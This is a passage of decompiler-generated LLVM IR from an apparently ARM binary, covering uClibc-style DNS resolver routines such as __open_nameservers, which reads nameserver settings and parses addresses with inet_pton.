  br label %dec_label_pc_18ff4

dec_label_pc_18ff4:                               ; preds = %bb228, %dec_label_pc_18f9c, %dec_label_pc_18f8c, %dec_label_pc_18fd0
  %stack_var_-480.1 = phi i32 [ 0, %dec_label_pc_18fd0 ], [ 0, %dec_label_pc_18f9c ], [ 0, %dec_label_pc_18f8c ], [ 1, %bb228 ]
  %v1_18ffc = load i32, i32* @r4, align 4
  %v1_19000 = add nuw nsw i32 %stack_var_-452.061, 1
  store i32 %v1_19000, i32* %r1.global-to-local, align 4
  store i32 %tmp159, i32* %r3.global-to-local, align 4
  %v3_19014 = icmp uge i32 %v1_19000, %tmp159
  store i1 %v3_19014, i1* %cpsr_c.global-to-local, align 1
  %v5_19018 = icmp slt i32 %v1_19000, %tmp159
  br i1 %v5_19018, label %dec_label_pc_18ff4.dec_label_pc_18dec_crit_edge, label %dec_label_pc_1901c

dec_label_pc_18ff4.dec_label_pc_18dec_crit_edge:  ; preds = %dec_label_pc_18ff4
  %v2_18ffc = add i32 %v1_18ffc, %stack_var_-460.364
  %v0_18df0.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_18dec

dec_label_pc_1901c:                               ; preds = %dec_label_pc_18ee4, %dec_label_pc_18dc8, %dec_label_pc_18ff4, %dec_label_pc_18f30, %dec_label_pc_18f60, %bb227
  %v1_19020 = call i32 @__GI_close(i32 %v3_18bf4)
  store i32 %arg3, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_19028 = icmp eq i32 %arg3, 0
  br i1 %v2_19028, label %.thread21, label %bb230

bb230:                                            ; preds = %dec_label_pc_1901c
  %v1_19030 = load i32, i32* @sl, align 4
  %v3_1902c = inttoptr i32 %arg3 to i32*
  store i32 %v1_19030, i32* %v3_1902c, align 4
  br label %bb231

.thread21:                                        ; preds = %dec_label_pc_1901c
  br label %bb231

bb231:                                            ; preds = %bb230, %.thread21
  store i32 ptrtoint (i32* @global_var_19038.655 to i32), i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_19028, i32 ptrtoint (i32* @global_var_1363c.312 to i32))
  store i32 %v1_1896c, i32* @r0, align 4
  %v0_1903c = call i32 @free()
  br label %dec_label_pc_190ac

dec_label_pc_19044:                               ; preds = %thread-pre-split, %dec_label_pc_18c40, %dec_label_pc_18da0, %dec_label_pc_18d98, %dec_label_pc_18d48, %dec_label_pc_18d54, %dec_label_pc_18d60thread-pre-split, %thread-pre-split.thread, %dec_label_pc_18d18, %dec_label_pc_18ee4, %dec_label_pc_18ed8, %dec_label_pc_18c04, %dec_label_pc_18be4, %dec_label_pc_18fc4
  %v1_19048 = add i32 %v0_18b08, 1
  store i32 %v1_19048, i32* @r5, align 4
  br label %dec_label_pc_19054

dec_label_pc_19054:                               ; preds = %.thread7, %dec_label_pc_19044
  %storemerge22 = phi i32 [ -1, %dec_label_pc_19044 ], [ %v7_18d04, %.thread7 ]
  %stack_var_-468.2 = phi i32 [ %v1_19048, %dec_label_pc_19044 ], [ %v0_18b08, %.thread7 ]
  store i32 %storemerge22, i32* @sb, align 4
  %v1_19058 = add i32 %stack_var_-476.1, -1
  store i32 %v1_19058, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp232 = icmp slt i32 %v1_19058, 1
  br i1 %tmp232, label %dec_label_pc_19074, label %dec_label_pc_18a0c

dec_label_pc_1906c:                               ; preds = %dec_label_pc_18bb8, %bb218, %bb213, %.thread5, %dec_label_pc_18988
  store i32 -1, i32* @ip, align 4
  br label %dec_label_pc_19074

dec_label_pc_19074:                               ; preds = %dec_label_pc_19054, %.thread132, %dec_label_pc_1906c
  %stack_var_-472.1 = phi i32 [ %v1_1896c, %dec_label_pc_1906c ], [ 0, %.thread132 ], [ %v1_1896c, %dec_label_pc_19054 ]
  %stack_var_-488.2 = phi i32 [ -1, %dec_label_pc_1906c ], [ -1, %.thread132 ], [ %v3_18bf4, %dec_label_pc_19054 ]
  %v0_19074 = call i32 @__GI___h_errno_location()
  store i32 %stack_var_-488.2, i32* %r1.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v2_19080 = icmp eq i32 %stack_var_-488.2, -1
  store i1 %v2_19080, i1* %cpsr_c.global-to-local, align 1
  %v7_19080 = icmp eq i32 %stack_var_-488.2, -1
  %v2_19084 = inttoptr i32 %v0_19074 to i32*
  store i32 -1, i32* %v2_19084, align 4
  br i1 %v7_19080, label %dec_label_pc_19094, label %dec_label_pc_1908c

dec_label_pc_1908c:                               ; preds = %dec_label_pc_19074, %dec_label_pc_18d40
  %stack_var_-472.2 = phi i32 [ %stack_var_-472.1, %dec_label_pc_19074 ], [ %v1_1896c, %dec_label_pc_18d40 ]
  %stack_var_-488.3 = phi i32 [ %stack_var_-488.2, %dec_label_pc_19074 ], [ %v3_18bf4, %dec_label_pc_18d40 ]
  %v1_19090 = call i32 @__GI_close(i32 %stack_var_-488.3)
  br label %dec_label_pc_19094

dec_label_pc_19094:                               ; preds = %dec_label_pc_19074, %dec_label_pc_1908c
  %stack_var_-472.3 = phi i32 [ %stack_var_-472.1, %dec_label_pc_19074 ], [ %stack_var_-472.2, %dec_label_pc_1908c ]
  store i32 %stack_var_-472.3, i32* @r0, align 4
  %v0_19098 = call i32 @free()
  %v0_1909c = load i32, i32* @sl, align 4
  store i32 %v0_1909c, i32* @r0, align 4
  %v0_190a0 = call i32 @free()
  br label %dec_label_pc_190ac

dec_label_pc_190ac:                               ; preds = %bb231, %dec_label_pc_19094
  %stack_var_-484.0 = phi i32 [ -1, %dec_label_pc_19094 ], [ %v5_18c7c, %bb231 ]
  store i32 %v3_18910, i32* @r4, align 4
  store i32 %v6_18910, i32* @r5, align 4
  store i32 %v9_18910, i32* @r6, align 4
  store i32 %v12_18910, i32* @r7, align 4
  store i32 %v15_18910, i32* @r8, align 4
  store i32 %v18_18910, i32* @sb, align 4
  store i32 %v21_18910, i32* @sl, align 4
  store i32 %v24_18910, i32* @fp, align 4
  store i32 %v27_18910, i32* @lr, align 4
  ret i32 %stack_var_-484.0

; uselistorder directives
  uselistorder i32 %stack_var_-488.2, { 1, 0, 3, 2 }
  uselistorder i32 %stack_var_-472.1, { 1, 0 }
  uselistorder i32 %v1_19058, { 1, 2, 0 }
  uselistorder i32 %v1_19000, { 1, 2, 3, 0 }
  uselistorder i32 %v0_18fb4, { 2, 1, 0, 3 }
  uselistorder i32 %v1_18f70, { 1, 0, 2 }
  uselistorder i32 %v2_18ea8, { 1, 0 }
  uselistorder i32 %v5_18e80, { 5, 0, 2, 3, 4, 1, 7, 6, 8 }
  uselistorder i32 %v2_18e40, { 3, 4, 0, 5, 6, 1, 2, 7, 8, 9, 10 }
  uselistorder i32 %v2_18e3c, { 1, 0 }
  uselistorder i32 %v2_18e20, { 0, 3, 2, 4, 1, 5, 6 }
  uselistorder i32 %v2_18e1c, { 1, 0 }
  uselistorder i32 %v1_18e18, { 1, 0, 2 }
  uselistorder i32 %stack_var_-452.061, { 4, 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-460.364, { 0, 1, 4, 5, 2, 3 }
  uselistorder i32 %v0_18d98, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v2_18d74, { 1, 0 }
  uselistorder i32 %v3_18d68, { 0, 2, 1, 3 }
  uselistorder i32 %v0_18d68, { 0, 2, 1 }
  uselistorder i32 %v2_18d58, { 0, 2, 1 }
  uselistorder i1 %v7_18c8c, { 1, 0 }
  uselistorder i32 %v1_18c8c, { 1, 0 }
  uselistorder i32 %v0_18c8c, { 1, 0 }
  uselistorder i32 %v5_18c7c, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 %v3_18bf4, { 1, 0, 2, 9, 7, 6, 5, 8, 4, 10, 11, 3 }
  uselistorder i32 %v6_18bac, { 1, 0, 2, 3 }
  uselistorder i32 %v0_18b38, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v3_18b20, { 4, 5, 6, 7, 0, 1, 2, 3 }
  uselistorder i32 %v1_18b14, { 1, 0 }
  uselistorder i32 %v0_18b08, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-464.1, { 1, 0 }
  uselistorder i32 %v0_18ac0, { 1, 0, 2, 3, 4 }
  uselistorder i1 %v7_18a10, { 1, 0 }
  uselistorder i32 %v1_18a14, { 0, 2, 1 }
  uselistorder i32 %stack_var_-468.0, { 0, 2, 1 }
  uselistorder i32 %v2_18dd0, { 1, 0, 2 }
  uselistorder i32 %v1_18ce0, { 2, 0, 1 }
  uselistorder i32 %v2_18b68, { 1, 0, 2 }
  uselistorder i32 %v2_18b40, { 1, 0 }
  uselistorder i32 %v0_18988, { 1, 0, 2 }
  uselistorder i32 %v1_1896c, { 7, 0, 3, 6, 4, 8, 1, 9, 2, 5, 10, 11 }
  uselistorder i32 %v3_18938, { 5, 1, 3, 2, 4, 0, 6 }
  uselistorder i32 %v0_18924, { 10, 9, 8, 7, 6, 5, 2, 11, 0, 1, 4, 3 }
  uselistorder i16* %stack_var_-104, { 2, 1, 0 }
  uselistorder i32* %stack_var_-192, { 2, 0, 3, 1, 4 }
  uselistorder i32 %tmp159, { 3, 8, 7, 0, 6, 2, 4, 1, 5 }
  uselistorder i32* %r3.global-to-local, { 52, 53, 17, 54, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 3, 18, 19, 2, 1, 20, 21, 22, 23, 24, 25, 26, 32, 27, 28, 29, 30, 31, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 0 }
  uselistorder i32* %r1.global-to-local, { 35, 36, 2, 3, 4, 5, 6, 7, 8, 9, 34, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 26, 22, 23, 24, 25, 27, 28, 29, 30, 31, 32, 33, 0, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 53, 54, 55, 20, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 1, 18, 19, 3, 21, 22, 23, 24, 25, 2, 26, 27, 28, 29, 30, 31, 32, 33, 34, 0, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52 }
  uselistorder i32 (i32)* @__GI_close, { 1, 0, 13, 18, 17, 16, 15, 14, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 23, { 2, 0, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__decode_dotted, { 1, 0 }
  uselistorder i32 -3, { 2, 0, 1, 3, 4 }
  uselistorder i32 192, { 0, 2, 1, 3 }
  uselistorder i32 ()* @__GI___h_errno_location, { 0, 3, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_recv, { 4, 3, 2, 1, 0 }
  uselistorder i32 64, { 2, 16, 0, 13, 9, 11, 4, 5, 6, 7, 1, 3, 14, 15, 10, 8, 12, 17 }
  uselistorder i32 1000, { 5, 3, 6, 4, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_send, { 4, 12, 11, 10, 9, 8, 7, 6, 5, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 2, 4, 3, 5, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @socket, { 1, 7, 6, 5, 4, 3, 2, 8, 0 }
  uselistorder i32 17, { 1, 7, 0, 9, 8, 2, 3, 5, 4, 6 }
  uselistorder i32 76, { 0, 5, 6, 7, 8, 9, 1, 10, 11, 12, 4, 13, 2, 14, 15, 19, 20, 21, 22, 16, 17, 18, 3 }
  uselistorder i32 27, { 2, 1, 0 }
  uselistorder i8 46, { 3, 2, 0, 4, 1, 5 }
  uselistorder i8 45, { 3, 1, 4, 2, 0, 5, 6, 7 }
  uselistorder i32 26316, { 2, 0, 1, 3 }
  uselistorder i32 512, { 4, 10, 3, 11, 2, 6, 7, 8, 9, 5, 0, 1 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_190ac, { 1, 0 }
  uselistorder label %dec_label_pc_19094, { 1, 0 }
  uselistorder label %dec_label_pc_19074, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1906c, { 0, 1, 4, 2, 3 }
  uselistorder label %dec_label_pc_19054, { 1, 0 }
  uselistorder label %dec_label_pc_19044, { 13, 9, 10, 2, 3, 6, 5, 4, 8, 0, 7, 1, 11, 12 }
  uselistorder label %bb231, { 1, 0 }
  uselistorder label %dec_label_pc_1901c, { 2, 4, 5, 3, 0, 1 }
  uselistorder label %dec_label_pc_18ff4, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_18f4c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_18ed8, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_18dec, { 1, 0 }
  uselistorder label %dec_label_pc_18d98, { 1, 0 }
  uselistorder label %dec_label_pc_18d68, { 1, 0 }
  uselistorder label %dec_label_pc_18d40, { 1, 0 }
  uselistorder label %dec_label_pc_18c8c, { 1, 0, 2 }
  uselistorder label %bb218, { 1, 0 }
  uselistorder label %dec_label_pc_18ae8, { 1, 0 }
  uselistorder label %dec_label_pc_18aac, { 1, 0 }
  uselistorder label %bb216, { 1, 0 }
}

define i32 @"$d"(i64* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_190bc:
  %tmp = ptrtoint i64* %arg1 to i32
  %stack_var_0 = alloca i16, align 2
  %v0_190bc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_190bc, label %bb, label %.thread13

bb:                                               ; preds = %dec_label_pc_190bc
  %v2_190bc = load i32, i32* @lr, align 4
  %v4_190bc = lshr i32 %v2_190bc, %arg3
  %v5_190bc = sub i32 32, %arg3
  %v6_190bc = shl i32 %v2_190bc, %v5_190bc
  %v7_190bc = or i32 %v6_190bc, %v4_190bc
  %v9_190bc = and i32 %v7_190bc, %tmp
  %v4_190c0 = inttoptr i32 %v9_190bc to i16*
  %tmp16 = ptrtoint i16* %stack_var_0 to i32
  %v5_190c0 = trunc i32 %tmp16 to i16
  store i16 %v5_190c0, i16* %v4_190c0, align 2
  %v6_190c0 = load i32, i32* @ip, align 4
  %v2_190c8 = load i32, i32* @r8, align 4
  %v9_190d8 = sub i32 0, %v2_190c8
  %v3_190dc = udiv i32 %v9_190d8, 256
  %v4_190dc = mul i32 %v2_190c8, -16777216
  %v5_190dc = or i32 %v3_190dc, %v4_190dc
  %v3_190e4 = udiv i32 %arg3, 256
  %v4_190e4 = mul i32 %arg3, 16777216
  %v5_190e4 = or i32 %v3_190e4, %v4_190e4
  %v8_190dc = and i32 %v5_190e4, %v9_190d8
  %v8_190e4 = and i32 %v8_190dc, %v5_190dc
  %v9_190ec = sub i32 %v8_190e4, %v6_190c0
  %v8_190f0 = shl i32 %v2_190c8, %v9_190ec
  %v3_190f4 = udiv i32 %arg2, 256
  %v4_190f4 = mul i32 %arg2, 16777216
  %v5_190f4 = or i32 %v3_190f4, %v4_190f4
  %v9_190f0 = and i32 %v9_190ec, %v5_190f4
  %v8_190f4 = and i32 %v9_190f0, %v8_190f0
  br label %.thread13

.thread13:                                        ; preds = %dec_label_pc_190bc, %bb
  %v9_190f4 = phi i32 [ %v8_190f4, %bb ], [ %tmp, %dec_label_pc_190bc ]
  ret i32 %v9_190f4

; uselistorder directives
  uselistorder i32 %v9_190d8, { 1, 0 }
  uselistorder i32 %v2_190c8, { 1, 0, 2 }
  uselistorder i32 %arg3, { 0, 1, 3, 2 }
  uselistorder label %.thread13, { 1, 0 }
}

define i32 @skip_nospace() local_unnamed_addr {
entry:
  store i32 524, i32* @lr, align 4
  store i32 ptrtoint (i16* @global_var_26010.295 to i32), i32* @ip, align 4
  call void @llvm.trap()
  unreachable
}

define i32 @skip_and_NUL_space(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_19150 = load i32, i32* @r4, align 4
  store i32 %v3_19150, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i16* @global_var_26010.295 to i32), i32* @ip, align 4
  store i32 524, i32* %r4.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v0_19160.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_191609 = inttoptr i32 %v0_19160.pre to i8*
  %v2_1916010 = load i8, i8* %v1_191609, align 1
  %v2_1916412 = icmp eq i8 %v2_1916010, 0
  store i1 %v2_1916412, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1916412, label %dec_label_pc_19194, label %dec_label_pc_19170

dec_label_pc_19170:                               ; preds = %entry, %bb8.dec_label_pc_19170_crit_edge
  %v1_19170 = phi i32 [ %v1_19170.pre, %bb8.dec_label_pc_19170_crit_edge ], [ 524, %entry ]
  %v0_19170 = phi i32 [ %v0_19170.pre, %bb8.dec_label_pc_19170_crit_edge ], [ ptrtoint (i16* @global_var_26010.295 to i32), %entry ]
  %v2_1916016 = phi i8 [ %v2_19160, %bb8.dec_label_pc_19170_crit_edge ], [ %v2_1916010, %entry ]
  %v2_1916817.in.in = phi i8 [ %v2_19160, %bb8.dec_label_pc_19170_crit_edge ], [ %v2_1916010, %entry ]
  %v1_1916015 = phi i8* [ %v1_19160, %bb8.dec_label_pc_19170_crit_edge ], [ %v1_191609, %entry ]
  %v2_1918814 = phi i32 [ %v2_1918c, %bb8.dec_label_pc_19170_crit_edge ], [ %v0_19160.pre, %entry ]
  %v2_1916817.in = zext i8 %v2_1916817.in.in to i32
  %v2_1916817 = mul nuw nsw i32 %v2_1916817.in, 2
  %v2_19170 = add i32 %v1_19170, %v0_19170
  %v3_19170 = inttoptr i32 %v2_19170 to i32*
  %v4_19170 = load i32, i32* %v3_19170, align 4
  %v2_19174 = add i32 %v4_19170, %v2_1916817
  %v3_19174 = inttoptr i32 %v2_19174 to i16*
  %v4_19174 = load i16, i16* %v3_19174, align 2
  %v1_19178 = and i16 %v4_19174, 32
  %v2_19178 = icmp eq i16 %v1_19178, 0
  store i1 %v2_19178, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19178, label %dec_label_pc_19194, label %dec_label_pc_19180

dec_label_pc_19180:                               ; preds = %dec_label_pc_19170
  %v7_19180 = icmp eq i8 %v2_1916016, 35
  br i1 %v7_19180, label %bb7, label %bb

bb:                                               ; preds = %dec_label_pc_19180
  %v8_19184 = icmp eq i8 %v2_1916016, 10
  br label %bb7

bb7:                                              ; preds = %dec_label_pc_19180, %bb
  %storemerge = phi i1 [ %v8_19184, %bb ], [ %v7_19180, %dec_label_pc_19180 ]
  store i1 %storemerge, i1* %cpsr_z.global-to-local, align 1
  %v0_19188 = load i32, i32* %lr.global-to-local, align 4
  %v1_19188 = trunc i32 %v0_19188 to i8
  store i8 %v1_19188, i8* %v1_1916015, align 1
  %v0_1918c = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_19198.pre = load i32, i32* %r0.global-to-local, align 4
  br i1 %v0_1918c, label %dec_label_pc_19194, label %bb8

bb8:                                              ; preds = %bb7
  %v2_1918c = add i32 %v1_19198.pre, 1
  store i32 %v2_1918c, i32* %r0.global-to-local, align 4
  %v1_19160 = inttoptr i32 %v2_1918c to i8*
  %v2_19160 = load i8, i8* %v1_19160, align 1
  %v2_19164 = icmp eq i8 %v2_19160, 0
  store i1 %v2_19164, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19164, label %dec_label_pc_19194, label %bb8.dec_label_pc_19170_crit_edge

bb8.dec_label_pc_19170_crit_edge:                 ; preds = %bb8
  %v0_19170.pre = load i32, i32* @ip, align 4
  %v1_19170.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_19170

dec_label_pc_19194:                               ; preds = %bb8, %dec_label_pc_19170, %bb7, %entry
  %v1_19198 = phi i32 [ %v0_19160.pre, %entry ], [ %v1_19198.pre, %bb7 ], [ %v2_1918814, %dec_label_pc_19170 ], [ %v2_1918c, %bb8 ]
  %v2_19194 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_19194, i32* @r4, align 4
  ret i32 %v1_19198

; uselistorder directives
  uselistorder i8 %v2_19160, { 2, 1, 0 }
  uselistorder i8* %v1_19160, { 1, 0 }
  uselistorder i32 %v2_1918c, { 0, 2, 3, 1 }
  uselistorder i1 %v2_19178, { 1, 0 }
  uselistorder i8 %v2_1916016, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 0, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 3, 1, 0, 2, 4 }
  uselistorder i32 524, { 0, 3, 4, 5, 2, 1, 6, 7 }
  uselistorder label %dec_label_pc_19194, { 0, 2, 1, 3 }
  uselistorder label %bb7, { 1, 0 }
  uselistorder label %dec_label_pc_19170, { 1, 0 }
}

define i32 @__open_nameservers() local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp38 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-544 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-304 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-68 = alloca i16, align 2
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-560 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_191a4 = load i32, i32* @r4, align 4
  store i32 %v3_191a4, i32* %stack_var_-36, align 4
  %v15_191a4 = load i32, i32* @r8, align 4
  %v18_191a4 = load i32, i32* @sb, align 4
  %v21_191a4 = load i32, i32* @sl, align 4
  %v24_191a4 = load i32, i32* @fp, align 4
  %v27_191a4 = load i32, i32* @lr, align 4
  store i32 27348, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i16* @global_var_26010.295 to i32), i32* @r5, align 4
  %v4_191b4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 27348) to i32*), align 4
  store i32 %v4_191b4, i32* @r4, align 4
  %v2_191b8 = icmp eq i32 %v4_191b4, 0
  br i1 %v2_191b8, label %dec_label_pc_191c4, label %dec_label_pc_191f4

dec_label_pc_191c4:                               ; preds = %entry
  %v2_191c8 = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v2_191c8, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 -34120), i32* %r0.global-to-local, align 4
  %v2_191d0 = call i32 @__GI_stat(i32 add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 -34120), i32 %v2_191c8)
  store i32 %v2_191d0, i32* %r0.global-to-local, align 4
  %v2_191d4 = icmp eq i32 %v2_191d0, 0
  %v1_191d8 = load i32, i32* @r4, align 4
  %.v1_191d8 = select i1 %v2_191d4, i32 %tmp38, i32 %v1_191d8
  store i32 26344, i32* %r1.global-to-local, align 4
  store i32 %.v1_191d8, i32* %r2.global-to-local, align 4
  %v0_191e4 = load i32, i32* @r5, align 4
  %v2_191e4 = add i32 %v0_191e4, 26344
  %v3_191e4 = inttoptr i32 %v2_191e4 to i32*
  %v4_191e4 = load i32, i32* %v3_191e4, align 4
  store i32 %v4_191e4, i32* %r3.global-to-local, align 4
  %v9_191e8 = icmp eq i32 %v4_191e4, %.v1_191d8
  br i1 %v9_191e8, label %bb58, label %bb

bb:                                               ; preds = %dec_label_pc_191c4
  store i32 %.v1_191d8, i32* %v3_191e4, align 4
  br label %bb58

bb58:                                             ; preds = %dec_label_pc_191c4, %bb
  store i32 102900, i32* @lr, align 4
  %v1_191f0 = xor i1 %v9_191e8, true
  call void @__pseudo_cond_branch(i1 %v1_191f0, i32 ptrtoint (i32* @global_var_19600.664 to i32))
  %v0_191f8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_191f4

dec_label_pc_191f4:                               ; preds = %entry, %bb58
  %v2_1920c = phi i32 [ ptrtoint (i16* @global_var_26010.295 to i32), %entry ], [ %v0_191f8.pre, %bb58 ]
  store i32 27360, i32* %r3.global-to-local, align 4
  %v2_191f8 = add i32 %v2_1920c, 27360
  %v3_191f8 = inttoptr i32 %v2_191f8 to i32*
  %v4_191f8 = load i32, i32* %v3_191f8, align 4
  store i32 %v4_191f8, i32* %r3.global-to-local, align 4
  %v2_191fc = icmp eq i32 %v4_191f8, 0
  br i1 %v2_191fc, label %dec_label_pc_19204, label %dec_label_pc_19598

dec_label_pc_19204:                               ; preds = %dec_label_pc_191f4
  %v4_1920c = add i32 %v2_1920c, 1122
  %v5_1920c = inttoptr i32 %v4_1920c to i8*
  store i8 5, i8* %v5_1920c, align 1
  store i32 -34120, i32* %r0.global-to-local, align 4
  store i32 1123, i32* %r3.global-to-local, align 4
  store i32 -35076, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v2_19220 = load i32, i32* @r5, align 4
  %v4_19220 = add i32 %v2_19220, 1123
  %v5_19220 = inttoptr i32 %v4_19220 to i8*
  store i8 3, i8* %v5_19220, align 1
  %v0_19224 = load i32, i32* @r5, align 4
  %v1_19224 = load i32, i32* %r0.global-to-local, align 4
  %v2_19224 = add i32 %v1_19224, %v0_19224
  store i32 %v2_19224, i32* @r0, align 4
  %v1_19228 = load i32, i32* %r1.global-to-local, align 4
  %v2_19228 = add i32 %v1_19228, %v0_19224
  store i32 %v2_19228, i32* @r1, align 4
  %v2_1922c = call i32 @__GI_fopen(i32 %v2_19224, i32 %v2_19228)
  store i32 %v2_1922c, i32* %r0.global-to-local, align 4
  store i32 %v2_1922c, i32* @fp, align 4
  %v2_19230 = icmp eq i32 %v2_1922c, 0
  br i1 %v2_19230, label %dec_label_pc_194bc, label %dec_label_pc_19464

dec_label_pc_1923c:                               ; preds = %dec_label_pc_19464, %dec_label_pc_19498.backedge
  store i32 %v2_19498, i32* %r0.global-to-local, align 4
  %v2_19240 = call i32 @skip_and_NUL_space(i8* %v1_19240)
  store i32 %v2_19240, i32* %r0.global-to-local, align 4
  store i32 %v2_19240, i32* @r4, align 4
  %v0_19248 = call i32 @skip_nospace()
  store i32 %v0_19248, i32* %r0.global-to-local, align 4
  %v1_1924c = inttoptr i32 %v0_19248 to i8*
  %v2_1924c = call i32 @skip_and_NUL_space(i8* %v1_1924c)
  store i32 %v2_19468, i32* @r1, align 4
  store i32 %v2_1924c, i32* @r7, align 4
  %v0_19258 = load i32, i32* @r4, align 4
  store i32 %v0_19258, i32* %r0.global-to-local, align 4
  %v2_1925c = inttoptr i32 %v0_19258 to i8*
  %v3_1925c = call i32 @__GI_strcoll(i8* %v2_1925c, i32 %v2_19468)
  store i32 %v3_1925c, i32* %r0.global-to-local, align 4
  %sext = mul i32 %v3_1925c, 16777216
  %v1_19260 = sdiv i32 %sext, 16777216
  store i32 %v1_19260, i32* @r6, align 4
  %sext.off = or i32 %sext, 16777215
  %tmp = icmp ult i32 %sext.off, 33554431
  br i1 %tmp, label %dec_label_pc_19268, label %dec_label_pc_19324

dec_label_pc_19268:                               ; preds = %dec_label_pc_1923c
  %v0_19268 = load i32, i32* @r7, align 4
  store i32 %v0_19268, i32* %r0.global-to-local, align 4
  %v0_1926c = call i32 @skip_nospace()
  %v1_1926c = inttoptr i32 %v0_1926c to i8*
  store i32 %v2_19270, i32* @r4, align 4
  %v0_19274 = load i32, i32* @r6, align 4
  %v1_19274 = trunc i32 %v0_19274 to i8
  store i8 %v1_19274, i8* %v1_1926c, align 1
  %v0_19278 = load i32, i32* @r6, align 4
  store i32 %v0_19278, i32* %r1.global-to-local, align 4
  store i32 28, i32* @r2, align 4
  store i32 %v2_19270, i32* %r0.global-to-local, align 4
  %v3_19284 = call i32 @__GI_memset(i8* %v2_19284, i32 %v0_19278)
  store i32 10, i32* %r0.global-to-local, align 4
  %v0_1928c = load i32, i32* @r7, align 4
  store i32 %v0_1928c, i32* %r1.global-to-local, align 4
  store i32 %v2_19290, i32* %r2.global-to-local, align 4
  %v3_19294 = inttoptr i32 %v0_1928c to i8*
  %v4_19294 = call i32 @inet_pton(i32 10, i8* %v3_19294, i32 %v2_19290)
  store i32 %v4_19294, i32* %r0.global-to-local, align 4
  %tmp59 = icmp slt i32 %v4_19294, 1
  br i1 %tmp59, label %dec_label_pc_192a4, label %dec_label_pc_192c0

dec_label_pc_192a4:                               ; preds = %dec_label_pc_19268
  %v0_192a4 = load i32, i32* @r7, align 4
  store i32 %v0_192a4, i32* %r1.global-to-local, align 4
  store i32 %v2_192a8, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_192b0 = inttoptr i32 %v0_192a4 to i8*
  %v4_192b0 = call i32 @inet_pton(i32 2, i8* %v3_192b0, i32 %v2_192a8)
  store i32 %v4_192b0, i32* %r0.global-to-local, align 4
  %tmp60 = icmp slt i32 %v4_192b0, 1
  br i1 %tmp60, label %dec_label_pc_19498.backedge, label %dec_label_pc_192c0

dec_label_pc_192c0:                               ; preds = %dec_label_pc_192a4, %dec_label_pc_19268
  %v0_192c4.off0 = phi i16 [ 10, %dec_label_pc_19268 ], [ 2, %dec_label_pc_192a4 ]
  store i32 %v2_192c0, i32* %r2.global-to-local, align 4
  store i16 %v0_192c4.off0, i16* %stack_var_-68, align 2
  store i32 13568, i32* %r3.global-to-local, align 4
